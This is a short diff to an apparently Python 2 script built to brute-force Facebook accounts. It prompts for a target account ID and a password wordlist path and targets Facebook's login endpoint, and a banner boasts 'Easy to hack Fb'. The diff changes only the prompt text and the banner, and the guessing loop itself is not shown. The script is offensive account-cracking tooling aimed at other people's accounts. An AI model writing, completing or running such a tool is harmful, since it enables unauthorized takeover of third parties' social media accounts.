@@ -9,10 +9,10 @@ import random
 
 
 
-email = str(raw_input("Enter the Facebook tergat ID : "))
+email = str(raw_input("FB tergat ID : "))
 
 
-passwordlist = str(raw_input("Enter the wordlist path : "))
+passwordlist = str(raw_input("wordlist path : "))
 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
@@ -63,7 +63,8 @@ def search():
 #welcome
 def welcome():
         wel = """
- Love──████████──████████─Sty home stay sefty     \033[1;91m
+
+ Love──████████──████████─Sty home stay sefty \033[1;91m
  hate──██▒▒▒▒██──██▒▒▒▒██─learn code     \033[1;91m
 late ──████▒▒██──██▒▒████─No one can hack fb     \033[1;91m
  nate────██▒▒▒▒██▒▒▒▒██───Easy to hack Fb      \033[1;91m
